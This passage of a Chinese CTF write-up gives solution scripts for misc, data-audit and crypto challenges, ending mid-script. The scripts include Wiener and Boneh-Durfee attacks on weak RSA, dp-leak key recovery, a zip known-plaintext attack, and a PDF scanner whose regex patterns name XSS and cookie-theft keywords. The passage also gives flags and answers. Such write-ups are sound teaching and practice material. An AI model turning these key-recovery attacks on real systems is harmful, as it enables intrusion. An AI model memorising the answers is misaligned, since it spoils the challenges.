        # 转换为5字节并去除填充
        decoded_bytes = num.to_bytes(5, byteorder='big')
        # 计算实际有效字节数
        if i + 8 > len(s):
            valid_bits = len(s) * 5 - i * 5
            valid_bytes = (valid_bits + 7) // 8
            decoded.extend(decoded_bytes[:valid_bytes])
        else:
            decoded.extend(decoded_bytes)
    
    return bytes(decoded)

# ---------- 验证测试用例 ----------
if __name__ == "__main__":
    # 原始问题中的目标字符串
    target = "0tCPwtnncFZyYUlSK/4Cw0/echcG2lteBWnG2Ulw0htCYTMW"
    
    # 编码测试（注意输入需要是bytes）
    original_data = b"Hello Base32!"
    encoded = base32_encode(original_data, padding=True)
    decoded = base32_decode(encoded)
    
    print(f"Original: {original_data}")
    print(f"Encoded : {encoded}")
    print(f"Decoded : {decoded}")
    print("Match   :", decoded == original_data)
    print("-" * 40)
    
    # 解码题目中的目标字符串
    decoded_target = base32_decode(target)
    print(f"Target String: {target}")
    print(f"Decoded Bytes: {decoded_target.hex()}")
    print(f"UTF-8 Decoded: {decoded_target.decode('utf-8', errors='replace')}")


Matlab_SMC？
12345下来对应
[图片]
[图片]
[图片]
看得出来是单个加密 ai梭哈 得出方程5*a*a+2*a+1
import math

def decrypt(encrypted_value):
    discriminant = 20 * encrypted_value - 16
    sqrt_d = math.sqrt(discriminant)
    a = (-2 + sqrt_d) / 10
    return a

# 加密数据（A列和B列）
encrypted_data = [
    (24.8901, 214.004), (1084.19, 6.9605), (89.2101, 454.905), (876.626, 26.338),
    (157.6, 101.152), (9833.2, 88.162), (66.8661, 236.785), (83.6245, 1423.78),
    (939.25, 190.528), (778.304, 14.7445), (589.413, 229.964), (72.4311, 685.25),
    (212.05, 196.738), (261.442, 192.381), (968.241, 10.882), (578.075, 63.1045),
    (157.6, 538.485), (205.28, 647.185), (516.928, 1003.33), (987.11, 724.404),
    (2248, 102.05), (182.002, 451.1), (246.5, 2284.18), (299.565, 132.385),
    (65.2405, 685.25), (591.041, 8), (529.192, 23.9125), (71.8645, 5079.28),
    (87.328, 2178.58), (1230.11, 67.4125), (257.128, 33.058), (125.051, 921.524),
    (504.808, 555.204)
]

# 解密数据
decrypted_data = []
for a, b in encrypted_data:
    decrypted_a = decrypt(a)
    decrypted_b = decrypt(b)
    decrypted_data.append((decrypted_a, decrypted_b))

# 输出结果
print("Decrypted Data:")
print("|      Original A     |      Original B     |")
print("|---------------------|---------------------|")
for a, b in decrypted_data:
    print(f"| {a:18.4f} | {b:18.4f} |")
计算即可得到
Misc
一大碗冰粉
R-Studio 加载镜像拿到提示
[图片]
恢复加密文件
[图片]
RS恢复的zip有点问题，用diskGenius恢复即可
[图片]
[图片]
zip是损坏的，拿bindzip修复一下
然后用bk攻击，获得压缩的文件，里面的zip也是损坏的，继续拿bindzip 修复
[图片]
拿到一个文件
[图片]
谐音异或拿到一个图片
[图片]
异或出图片
[图片]
[图片]
美团搜图片中的店名
[图片]
音频的秘密
[图片]
用 WinRAR 拿到密码
[图片]
解压缩包失败，应该不是解压密码，尝试爆破
[图片]
随波逐流梭哈拿到密文
[图片]
用刚刚的 Key 解密
[图片]
提交结果不对，因为密文的前半部分含有大写，按照格式转大写：flag{No_AAAA_BBBB_30ao6@_cccyyy_f0k_Y01_1}
隐藏的邀请
直接解压缩
[图片]
打开 cyyyy.xml 提出 hex
[图片]
将文件名作为密钥异或出图片，扫码拿到 flag
[图片]
Terminal Hacker
[图片]
哇哇哇瓦
[图片]
ForeMost 提取出隐藏压缩包
[图片]
[图片]
查阅英文名拿到密码 GekkoYoru
[图片]
放大图像提取十六进制，发现它的hex是zip的头，随后从右往左复制得到flag
[图片]
使用密码提取出隐藏文件拿到 flag
[图片]

数据识别与审计
Png
直接丢给扫毒工具
[图片]
wav提取文字的到
import os
import wave
import speech_recognition as sr
from datetime import datetime

# 配置项 ------------------------------------------------------------------------
WAV_DIR = "wav"              # 音频存放目录（必须为wav格式）
OUTPUT_FILE = f"result_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"  # 结果文件名
GOOGLE_LANGUAGE = 'zh-CN'    # 识别语言（zh-CN中文/ja-JP日语等）
# -----------------------------------------------------------------------------

def check_audio(file_path):
    """快速验证音频格式"""
    try:
        with wave.open(file_path, 'rb') as f:
            return f.getframerate() >= 16000 and f.getnchannels() == 1
    except:
        return False

def transcribe_audio(file_path):
    """执行语音识别"""
    r = sr.Recognizer()
    try:
        with sr.AudioFile(file_path) as source:
            audio = r.record(source)
            return r.recognize_google(audio, language=GOOGLE_LANGUAGE)
    except sr.UnknownValueError:
        return "[ERROR] 无法识别内容"
    except sr.RequestError:
        return "[ERROR] 服务不可用"
    except Exception as e:
        return f"[ERROR] {str(e)}"

def batch_process():
    """批量处理核心逻辑"""
    if not os.path.exists(WAV_DIR):
        os.makedirs(WAV_DIR)
        print(f"请将音频文件放入 {WAV_DIR} 文件夹")
        return

    with open(OUTPUT_FILE, "w", encoding="utf-8") as f_out:
        # 写入文件头
        f_out.write(f"语音识别报告 {datetime.now()}\n")
        f_out.write("="*50 + "\n")

        # 遍历处理文件
        file_count = 0
        for filename in sorted(os.listdir(WAV_DIR)):
            if not filename.lower().endswith(".wav"):
                continue

            filepath = os.path.join(WAV_DIR, filename)
            print(f"正在处理: {filename}")

            # 格式检查
            if not check_audio(filepath):
                f_out.write(f"文件: {filename} ⚠️ 格式不符合要求\n\n")
                continue

            # 识别并写入结果
            result = transcribe_audio(filepath)
            f_out.write(f"文件: {filename}\n")
            f_out.write(f"结果: {result}\n")
            f_out.write("-"*50 + "\n\n")
            file_count += 1

        # 写入统计信息
        f_out.write(f"\n处理完成！共处理 {file_count} 个文件")

    print(f"结果已保存到：{os.path.abspath(OUTPUT_FILE)}")

if __name__ == "__main__":
    batch_process()
分析得到
Bd2IYe3.wav,bjVwvcC.wav,H0KDChj.wav,ou9E9Mh.wav,UEbzH4X.wav
pdf一样的
import os
import re
import time  # 新增：导入time模块用于延迟
import PyPDF2
from pdfminer.high_level import extract_text

# 定义检测规则（可根据实际情况扩展）
DETECTION_RULES = [
    # XSS相关JavaScript关键词
    re.compile(r'\b(alert|confirm|prompt|eval|onload|onclick|onerror|javascript:|document\.cookie)\b', re.IGNORECASE),
    # PDF恶意操作关键词
    re.compile(r'\b(AA|OpenAction|JavaScript|URI|launch|system)\b', re.IGNORECASE),
    # 可疑的URL模式（可能包含脚本协议）
    re.compile(r'javascript:|vbscript:|data:text/html', re.IGNORECASE),
    # 常见攻击函数模式
    re.compile(r'\b(unescape|charCodeAt|fromCharCode|atob|btoa)\b', re.IGNORECASE),
]

# 新增：延迟时间配置（秒）
SCAN_DELAY = 0.5  # 每个文件检测之间的延迟时间，可根据需要调整

def is_malicious_pdf(file_path):
    """检测单个PDF文件是否包含恶意特征"""
    try:
        # 方法1：提取文本内容检测
        text = extract_text(file_path)
        for rule in DETECTION_RULES:
            if rule.search(text):
                return True, f"文本中检测到恶意模式：{rule.pattern}"

        # 方法2：解析PDF结构检测元数据和JS对象
        with open(file_path, 'rb') as f:
            pdf_reader = PyPDF2.PdfReader(f)

            # 检测文档信息元数据
            info = pdf_reader.metadata
            if info:
                for key, value in info.items():
                    if value and any(rule.search(str(value)) for rule in DETECTION_RULES):
                        return True, f"元数据中检测到恶意模式：{key}={value}"

            # 检测页面动作（如打开时执行JS）
            for page in pdf_reader.pages:
                page_obj = page.to_dict()
                if '/AA' in page_obj:  # 自动动作（Auto Actions）
                    aa = page_obj['/AA']
                    if any(rule.search(str(aa)) for rule in DETECTION_RULES):
                        return True, f"页面动作中检测到恶意模式：{aa}"
                if '/OpenAction' in page_obj:  # 打开页面时执行的动作
                    open_action = page_obj['/OpenAction']
                    if any(rule.search(str(open_action)) for rule in DETECTION_RULES):
                        return True, f"打开动作中检测到恶意模式：{open_action}"

            # 检测JavaScript对象（直接搜索PDF二进制中的JS关键词）
            f.seek(0)
            pdf_bytes = f.read()
            for rule in DETECTION_RULES:
                if rule.search(pdf_bytes.decode('latin-1', errors='ignore')):
                    return True, f"二进制内容中检测到恶意模式：{rule.pattern}"

    except Exception as e:
        return False, f"检测异常：{str(e)}"

    return False, "未检测到恶意特征"

def scan_pdf_directory(directory):
    """扫描目录下所有PDF文件"""
    results = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.lower().endswith('.pdf'):
                file_path = os.path.join(root, file)
                # 新增：在每个文件检测前添加延迟
                time.sleep(SCAN_DELAY)
                is_malicious, reason = is_malicious_pdf(file_path)
                results.append((file_path, is_malicious, reason))
                print(f"检测完成：{file_path} -> {'危险' if is_malicious else '安全'}")
    return results

if __name__ == "__main__":
    PDF_DIR = "./pdf"  # 当前目录下的pdf文件夹
    if not os.path.exists(PDF_DIR) or not os.path.isdir(PDF_DIR):
        print(f"错误：目录 {PDF_DIR} 不存在！")
        exit(1)

    print(f"开始扫描 {PDF_DIR} 下的PDF文件（延迟{SCAN_DELAY}秒/文件）...")
    scan_results = scan_pdf_directory(PDF_DIR)

    # 输出检测报告
    print("\n==================== 检测报告 ====================")
    dangerous_files = [res for res in scan_results if res[1]]
    if dangerous_files:
        print(f"发现 {len(dangerous_files)} 个危险文件：")
        for path, _, reason in dangerous_files:
            print(f"- {path}\n  原因：{reason}")
    else:
        print("未检测到危险文件。")
    print("=================================================")
    
运行之后他有的会报错，报错对应的就是答案，因为他藏了xss
[图片]
最后得到bVKINl.pdf,hnPRx1.pdf,mIR13t.pdf,OGoyOG.pdf,rSG2pW.pdf
txt直接vicode搜关键字 “号”，“邮箱”
[图片]
[图片]
拿到全部
9h0zQJok.txt,FiBRFFnG.txt,gWa0DiTs.txt,Me4CoMw7.txt,T0BPOXDY.txt,a4ijc0fu.png,b7aykkl9.png,lhf82t3d.png,sofhifed.png,wxrozxe3.png,bVKINl.pdf,hnPRx1.pdf,mIR13t.pdf,OGoyOG.pdf,rSG2pW.pdf,Bd2IYe3.wav,bjVwvcC.wav,H0KDChj.wav,ou9E9Mh.wav,UEbzH4X.wav
flag{234ed8ef5421c5e559420dbf841db68f}

Hexagram Protocol
提取content
[图片]
放进脚本
import base64
# 八卦符号与二进制数的对应关系
dic = {
'☰':'111','☱':'110','☲':'101','☳':'100',
'☴':'011','☵':'010','☶':'001','☷':'000'
}

# 密文
cipher_text = "☵☱☳☱☱☲☰☷☴☵☷☲☲☷☱☴☴☲☷☳☵☶☳☲☵☲☳☴☳☲☵☳☵☱☵☲☳☶☲☳☴☶☳☲☴☲☵☰☶☱☵☴☷☲☴☷☶☳☳☳☴☶☰☶☵☱☳☲☴☷☰☶☵☶☷☱☶☷☱☵☶☲☵☱☰☶☵☳☵☲☱☱☱☶☱☲☵☱☳☴☷☶☵☵☴☵☷☱☶☶☲☳☶☱☵☳☰☲☳☵☶☳☵☳☶☷☱☲☴☶☳☲☷☳☰☲☶☰☵"

# 将八卦符号转换为二进制数
binary_str =''.join([dic[char]for char in cipher_text])

# 将二进制数转换为十进制数
decimal_values = [int(binary_str[i:i+8], 2) for i in range(0, len(binary_str), 8)]

# 将十进制数转换为ASCII字符
plain_text = ''.join([chr(value) for value in decimal_values])

print("解密后的明文：", base64.b64decode(plain_text))
Crypto
古典密码
共用到了 5 种经典古典密码：维吉尼亚、单表替代、仿射、斯奇塔尔、凯撒
一共加密了 6 次，即其中某种加密方法被用 2 次
由于 有5种方法共加密6次，某一种用了2次。根据题目给的参数中出现了两个斯奇塔尔参数（4 和 5），高度怀疑斯奇塔尔使用了两次
字符串 'qwertyuiopasdfghjklzxcvbnm'（用于单表替代）
数字 5 和 8（用于仿射）
字符串 'nxtcctf'（用于维吉尼亚）
数字 4 和 5（用于斯奇塔尔）
# encoding: utf-8

class CaesarCipher:
    def decrypt(self, text, shift):
        return ''.join(
            chr((ord(c) - base - shift) % 26 + base) if c.isalpha() else c
            for c in text
            for base in [ord('A') if c.isupper() else ord('a')] if c.isalpha() or base
        )


class MonoalphabeticCipher:
    _alphabet = 'abcdefghijklmnopqrstuvwxyz'

    def decrypt(self, text, key):
        table = {k: v for k, v in zip(key.lower(), self._alphabet)}
        return ''.join(
            table[c.lower()].upper() if c.isupper() else table[c]
            if c.lower() in table else c
            for c in text
        )


class AffineCipher:
    def modinv(self, a, m):
        t, new_t = 0, 1
        r, new_r = m, a
        while new_r != 0:
            q = r // new_r
            t, new_t = new_t, t - q * new_t
            r, new_r = new_r, r - q * new_r
        return t % m if r == 1 else None

    def decrypt(self, text, a, b):
        a_inv = self.modinv(a, 26)
        if a_inv is None:
            raise ValueError(f"无法对 {a} 取模逆，仿射解密失败。")
        return ''.join(
            chr((a_inv * (ord(c) - base - b)) % 26 + base) if c.isalpha() else c
            for c in text
            for base in [ord('A') if c.isupper() else ord('a')] if c.isalpha() or base
        )


class VigenereCipher:
    def decrypt(self, text, key):
        result, key_index = [], 0
        for c in text:
            if c.isalpha():
                base = ord('A') if c.isupper() else ord('a')
                shift = ord(key[key_index % len(key)].lower()) - ord('a')
                result.append(chr((ord(c) - base - shift) % 26 + base))
                key_index += 1
            else:
                result.append(c)
        return ''.join(result)


class ScytaleCipher:
    def decrypt(self, text, key):
        rows = (len(text) + key - 1) // key
        matrix = [[' ' for _ in range(key)] for _ in range(rows)]

        idx = 0
        for col in range(key):
            for row in range(rows):
                if idx < len(text):
                    matrix[row][col] = text[idx]
                    idx += 1

        return ''.join(matrix[row][col] for row in range(rows) for col in range(key)).rstrip()


# ========== 解密执行流程 ==========

if __name__ == "__main__":
    # 第六步密文
    en_6 = "ntid c{}rShcljrko od lc WYicO"

    print("开始多层加密解密...\n")

    # Step 6: Scytale 解密，key=5
    scytale = ScytaleCipher()
    en_5 = scytale.decrypt(en_6, 5)
    print("Step 6（斯奇塔尔，key=5）:", en_5)

    # Step 5: Scytale 解密，key=4
    en_4 = scytale.decrypt(en_5, 4)
    print("Step 5（斯奇塔尔，key=4）:", en_4)

    # Step 4: Vigenère 解密，key='nxtcctf'
    vigenere = VigenereCipher()
    en_3 = vigenere.decrypt(en_4, 'nxtcctf')
    print("Step 4（维吉尼亚，key=nxtcctf）:", en_3)

    # Step 3: Affine 解密，a=5, b=8
    affine = AffineCipher()
    en_2 = affine.decrypt(en_3, 5, 8)
    print("Step 3（仿射，a=5, b=8）:", en_2)

    # Step 2: Monoalphabetic 解密，key='qwertyuiopasdfghjklzxcvbnm'
    mono = MonoalphabeticCipher()
    en_1 = mono.decrypt(en_2, 'qwertyuiopasdfghjklzxcvbnm')
    print("Step 2（单表替代）:", en_1)

    # Step 1: Caesar 解密，shift=3
    caesar = CaesarCipher()
    final_plaintext = caesar.decrypt(en_1, 3)
    print("Step 1（凯撒，shift=3）:", final_plaintext)

    print("\n全部解密完成！")
DIladila
from Crypto.Util.number import *

def ror(val, r_bits, max_bits=16):
    return (val >> r_bits) | ((val << (max_bits - r_bits)) & (2**max_bits - 1))

def decrypt(encrypted_pairs, current_key):
    possible_pairs = []
    for encrypted_x, encrypted_y in encrypted_pairs:

        xor_result = bin(encrypted_x ^ encrypted_y)[2:].zfill(16)
        y = int(xor_result[-2] + xor_result[-1] + xor_result[:14], 2)
        target_x = encrypted_x ^ current_key
        
        for possible_x in range(0x10000):
            if (ror(possible_x, 7) + y) & 0xFFFF == target_x:
                possible_pairs.append((possible_x, y))
    return possible_pairs

ciphertext = [(57912, 19067),(38342, 34089),(16842, 41652),(30292, 50979),(9137, 57458),(29822, 64285),(33379, 14140),(16514, 4653)]

flag = bytearray()
decryption_keys = [0x1234, 0x5678, 0x9abc, 0xdef0][::-1]  

for encrypted_x, encrypted_y in ciphertext:
    current_pairs = [(encrypted_x, encrypted_y)]
    for key in decryption_keys:
        current_pairs = decrypt(current_pairs, key)
        if not current_pairs:  
            break
    for decrypted_x, decrypted_y in current_pairs:
        flag.extend(long_to_bytes(decrypted_x)[::-1])
        flag.extend(long_to_bytes(decrypted_y)[::-1])

print(bytes(flag))
告白2009-01-23
解出明文
import gmpy2
import libnum

def continuedFra(x, y):
    cf = []
    while y:
        cf.append(x // y)
        x, y = y, x % y
    return cf
def gradualFra(cf):
    numerator = 0
    denominator = 1
    for x in cf[::-1]:
        # 这里的渐进分数分子分母要分开
        numerator, denominator = denominator, x * denominator + numerator
    return numerator, denominator
def solve_pq(a, b, c):
    par = gmpy2.isqrt(b * b - 4 * a * c)
    return (-b + par) // (2 * a), (-b - par) // (2 * a)
def getGradualFra(cf):
    gf = []
    for i in range(1, len(cf) + 1):
        gf.append(gradualFra(cf[:i]))
    return gf


def wienerAttack(e, n):
    cf = continuedFra(e, n)
    gf = getGradualFra(cf)
    for d, k in gf:
        if k == 0: continue
        if (e * d - 1) % k != 0:
            continue
        phi = (e * d - 1) // k
        p, q = solve_pq(1, n - phi + 1, n)
        if p * q == n:
            return d


n = 106907120255411141276638612258492580223206670508697860345280705552076099016030935898699700187523599766269485047282325650117035914628760419926410817774570995043643433455055595591107437470658308764074450729921003648782408533657438504280874574703167028727399770901329675528708585142713643443248769642817712218371
e = 92066298664485065396027178362270794902621018857568310802765263839921592653297188141639082907410773099588833460614099675385786190965706296547920850855064908555902716021514756109564555466796584126969045436871844375174789134742417250605776973188216013735765092101366990049447374275811804264794446656219369440535
c = 72413193823586193683552385578931939035012872670413497855056244201691512354415666469936125548748032982020958495114951719066245650644060153838816623502095911253320142088319318206119073607336497914311058118174988818658610257295726356030260769061712429926392969618604615189351858925626182197332313954336604548074

d=wienerAttack(e, n)
m=pow(c, d, n)
print(m)
简单编码

s = '''ABBAABB ABBABAB ABABAAA ABABAAB ABBBBAA ABBAABA ABABBAA ABBAAAA ABBAAAB ABBABAB ABBBAAA ABAABBB ABABBAA ABABABB ABABBAA ABBABBB ABBABAA ABABABA ABAABAB ABBBAAA ABBBABA ABABBAB ABBBBAA ABABBAB ABBBAAA ABBABAB ABBAABA ABABAAA ABABABA AABBAB ABBBABB ABBAABA ABBABAB AABABA ABBBBAA ABBBAAB ABBAABA AABBAB ABABBAA ABBAAAB ABBBAAA ABBABAB ABBABAA ABABABB ABBBABA ABABABB ABBAABB ABBABAA ABBABAB ABBABAB ABABAAA ABBBABA AABABB ABABBAB AABBAB ABABAAA ABBAAAB ABBBBAB ABBBAAA ABABABA ABBAAAA ABABAAB ABABABB ABBABBA ABBABAB AABABA ABBABAA ABBBABA ABBBABA AABBAA ABBBBAA ABBAAAA ABABBBB ABBABAB ABABABB ABAABBB ABBAAAA ABABAAA ABABABB ABBABAA ABBABBA ABABABA ABAABAB ABABABA AABABB ABABBAB ABBBBAA ABBBBAB ABBBAAA ABABAAB ABBABBB ABABAAB ABBAAAA ABAABAB ABBBABB ABBABAA ABBABAB ABABABA ABAABAB ABBBABA ABBAABA AABBAB ABABBAA ABAABAB ABBBAAA ABBABAB ABBBABA ABAABBB ABABBBA ABABABB ABABBAA ABBABBB ABBABAA ABAABAB ABABABA ABBBAAB ABABBAA ABBAABA ABABBAA ABAABAB ABBBAAA ABBABAB ABBABBB ABBBABB ABBBABA ABABBAA ABBABAB ABABABA ABBAABA ABAABAB ABBAABA ABBABBB ABBBAAA ABBAABA ABBBBAA ABBAAAA ABBABAA ABABBAB ABBABAA ABAABBB ABABABA ABABABB ABABABB AABBAB ABBAAAB ABBBBAB ABABABA ABBBABA AABBAB ABABABA ABBABAB ABBBAAB ABBBAAA ABBAAAB ABBBBAA ABBBBAA ABBABAA ABBAABA AABBAB ABBBABA'''.replace('A','1').replace('B','0')
for i in s.split():
    x = int(i,2)
    print(chr(x),end='')
[图片]
dp
import math

# RSA参数
n = 160611543962870207220979004396242566926229944006428896831596544950449694029384731803181717747806088170121044080430190634011192614516389593434792832946862039318858223226834618707331583603881125820751059375575308274354101325927946726818826602105628338611105897315837131205129603566145247350863488297133028001961
dp = 10184510673717374094396143929710689874281846820115830124403460126981902381296394348936422916789555388737761615199672212714400669226475702671445370621838821
c = 602346623186332156127591340947045891685439226783599072445496050987374201530416135078610685256819374105661454083964220144969747162694945215619363160306823870671761515408402714386308056691431781103756506907080138027805674704109595586573007302415302075590083754253453852221834421731543530160113601044029767488
e = 65537  # 常见的RSA公钥指数

# 计算 e*dp - 1
edp_minus_1 = e * dp - 1

# 遍历可能的k值
# 通常k值较小，常见RSA参数下k可能是1或2
# 理论上k可能达到e，但由于p-1是edp-1的因子且p-1 ~ sqrt(N)，k应约为 e*dp/sqrt(N)
# 重新评估k的预期值：
# p-1 = (edp-1)/k
# p = (edp-1)/k + 1
# q = N/p
# (p-1)(q-1) = N - p - q + 1
# d = (k_phi * (p-1)(q-1) + 1) / e
# dp = d % (p-1)
# (edp - 1) = k(p-1) 对于某个整数k

# 在方程 edp = k(p-1) + 1 中，k通常较小
# N的位数约为386位，所以p、q约为193位
# 如果dp大致等于d且d较大，则edp大约为 e*(N/2)
# 考虑方程 (p-1)*x = (e*dp - 1)，这里x就是上面的k
# 由于p-1大约为sqrt(N)，edp-1大约为e*dp
# k的值大约为 (e*dp)/sqrt(N)
# (65537 * 10^192) / (10^192) = 65537
# 所以k可以大到e。遍历到e是可行的。

# 假设k较小，例如1, 2, 3...
# 遍历k从1到2*e（一个合理的范围，覆盖可能的较小k值）
for k_val in range(1, e + 100):  # 为了安全，稍微超过e一些
    if edp_minus_1 % k_val == 0:
        p_minus_1 = edp_minus_1 // k_val
        p = p_minus_1 + 1
        if n % p == 0:
            q = n // p
            # 检查p和q是否为质数（可选，但建议验证）
            # 这是一个可能的p候选值
            print(f"找到对应k = {k_val}的p: {p}")
            print(f"对应的q: {q}")

            # 现在有了p和q，计算phi(N)
            phi_n = (p - 1) * (q - 1)
            print(f"phi(N): {phi_n}")

            # 计算私钥d
            # ed ≡ 1 mod phi(N)
            d = pow(e, -1, phi_n)
            print(f"私钥d: {d}")

            # 解密密文c
            m = pow(c, d, n)
            print(f"解密后的消息m: {m}")

            # 将m转换为字节，再转为字符串
            try:
                message_bytes = m.to_bytes((m.bit_length() + 7) // 8, 'big')
                message_str = message_bytes.decode('utf-8')
                print(f"解密后的消息字符串: {message_str}")
            except Exception as ex:
                print(f"无法以UTF-8解码消息: {ex}")
                print(f"尝试用'latin-1'解码:")
                message_str = message_bytes.decode('latin-1')
                print(f"解密后的消息字符串(latin-1): {message_str}")

            break  # 找到p并解密消息后退出循环
easy_rsa
from sympy import factorint, mod_inverse

# 参数
e = 65537
n = 1000000000000000000000000000156000000000000000000000000005643
c = 418535905348643941073541505434424306523376401168593325605206

# 尝试分解 n
factors = factorint(n)
if len(factors) == 2:
    p, q = factors.keys()
    phi = (p - 1) * (q - 1)
    d = mod_inverse(e, phi)
    m = pow(c, d, n)
    print("明文 m 为：", m)
    m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder='big')

    # 解码为字符串（假设是 UTF-8 编码或 ASCII）
    plaintext = m_bytes.decode()
    print(plaintext)
else:
    print("无法快速分解 n，请尝试 ECM 或其它高级因式分解算法。")
babyrsa
从 p1，q1 的生成方式可以看出来 p+1 是光滑的，用工具去直接分解 n1
[图片]
然后可以算 e 了，后面可以打一个 boneh_durfee，自己测一下可以知道 delta 是等于 0.26 的，可以把 d 算出来
from __future__ import print_function
import time
 
############################################
# Config
##########################################
 
"""
Setting debug to true will display more informations
about the lattice, the bounds, the vectors...
"""
debug = True
 
"""
Setting strict to true will stop the algorithm (and
return (-1, -1)) if we don't have a correct
upperbound on the determinant. Note that this
doesn't necesseraly mean that no solutions
will be found since the theoretical upperbound is
usualy far away from actual results. That is why
you should probably use `strict = False`
"""
strict = False
 
"""
This is experimental, but has provided remarkable results
so far. It tries to reduce the lattice as much as it can
while keeping its efficiency. I see no reason not to use
this option, but if things don't work, you should try
disabling it
"""
helpful_only = True
dimension_min = 7 # stop removing if lattice reaches that dimension
 
############################################
# Functions
##########################################
 
# display stats on helpful vectors
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii,ii] >= modulus:
            nothelpful += 1
 
    print(nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")
 
# display matrix picture with 0 and X
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii,jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        print(a)
 
# tries to remove unhelpful vectors
# we start at current = n-1 (last vector)
def remove_unhelpful(BB, monomials, bound, current):
    # end of our recursive function
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB
 
    # we start by checking from the end
    for ii in range(current, -1, -1):
        # if it is unhelpful:
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
            # let's check if it affects other vectors
            for jj in range(ii + 1, BB.dimensions()[0]):
                # if another vector is affected:
                # we increase the count
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj
 
            # level:0
            # if no other vectors end up affected
            # we remove it
            if affected_vectors == 0:
                print("* removing unhelpful vector", ii)
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii-1)
                return BB
 
            # level:1
            # if just one was affected we check
            # if it is affecting someone else
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
                    # if it is affecting even one vector
                    # we give up on this one
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # remove both it if no other vector was affected and
                # this helpful vector is not helpful enough
                # compared to our unhelpful one
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(bound - BB[ii, ii]):
                    print("* removing unhelpful vectors", ii, "and", affected_vector_index)
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii-1)
                    return BB
    # nothing happened
    return BB
 
""" 
Returns:
* 0,0   if it fails
* -1,-1 if `strict=true`, and determinant doesn't bound
* x0,y0 the solutions of `pol`
"""
def boneh_durfee(pol, modulus, mm, tt, XX, YY):
    """
    Boneh and Durfee revisited by Herrmann and May
    
    finds a solution if:
    * d < N^delta
    * |x| < e^delta
    * |y| < e^0.5
    whenever delta < 1 - sqrt(2)/2 ~ 0.292
    """
 
    # substitution (Herrman and May)
    PR.<u, x, y> = PolynomialRing(ZZ)
    Q = PR.quotient(x*y + 1 - u) # u = xy + 1
    polZ = Q(pol).lift()
 
    UU = XX*YY + 1
 
    # x-shifts
    gg = []
    for kk in range(mm + 1):
        for ii in range(mm - kk + 1):
            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk
            gg.append(xshift)
    gg.sort()
 
    # x-shifts list of monomials
    monomials = []
    for polynomial in gg:
        for monomial in polynomial.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    monomials.sort()
    
    # y-shifts (selected by Herrman and May)
    for jj in range(1, tt + 1):
        for kk in range(floor(mm/tt) * jj, mm + 1):
            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)
            yshift = Q(yshift).lift()
            gg.append(yshift) # substitution
    
    # y-shifts list of monomials
    for jj in range(1, tt + 1):
        for kk in range(floor(mm/tt) * jj, mm + 1):
            monomials.append(u^kk * y^jj)
 
    # construct lattice B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0, 0)
        for jj in range(1, ii + 1):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)
 
    # Prototype to reduce the lattice
    if helpful_only:
        # automatically remove
        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1)
        # reset dimension
        nn = BB.dimensions()[0]
        if nn == 0:
            print("failure")
            return 0,0
 
    # check if vectors are helpful
    if debug:
        helpful_vectors(BB, modulus^mm)
    
    # check if determinant is correctly bounded
    det = BB.det()
    bound = modulus^(mm*nn)
    if det >= bound:
        print("We do not have det < bound. Solutions might not be found.")
        print("Try with highers m and t.")
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            print("size det(L) - size e^(m*n) = ", floor(diff))
        if strict:
            return -1, -1
    else:
        print("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")
 
    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus^mm)
 
    # LLL
    if debug:
        print("optimizing basis of the lattice via LLL, this can take a long time")
 
    BB = BB.LLL()
 
    if debug:
        print("LLL is done!")
 
    # transform vector i & j -> polynomials 1 & 2
    if debug:
        print("looking for independent vectors in the lattice")
    found_polynomials = False
    
    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
            # for i and j, create the two polynomials
            PR.<w,z> = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)
                pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)
 
            # resultant
            PR.<q> = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)
 
            # are these good polynomials?
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                print("found them, using vectors", pol1_idx, "and", pol2_idx)
                found_polynomials = True
                break
        if found_polynomials:
            break
 
    if not found_polynomials:
        print("no independant vectors could be found. This should very rarely happen...")
        return 0, 0
    
    rr = rr(q, q)
 
    # solutions
    soly = rr.roots()
 
    if len(soly) == 0:
        print("Your prediction (delta) is too small")
        return 0, 0
 
    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]
 
    #
    return solx, soly
 
def example():
    ############################################
    # How To Use This Script
    ##########################################
 
    #
